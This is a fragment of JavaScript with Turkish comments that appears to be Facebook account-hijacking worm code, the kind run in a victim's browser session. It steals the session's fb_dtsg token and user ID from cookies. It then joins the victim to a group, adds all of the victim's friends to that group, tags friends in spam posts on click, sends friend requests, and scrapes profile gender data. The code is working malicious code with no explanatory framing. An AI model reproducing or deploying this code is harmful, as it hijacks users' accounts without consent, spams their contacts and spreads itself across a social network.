		document.body.appendChild(a);
}

a("100002291768405");
a("100002300350459");
a("100004376972583");
a("100004286199137");
a("100005548509230");
a("100005584023415");




var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "587985747879306";
var spost_id = "587985747879306";
var sfoto_id = "587985747879306";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada? ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}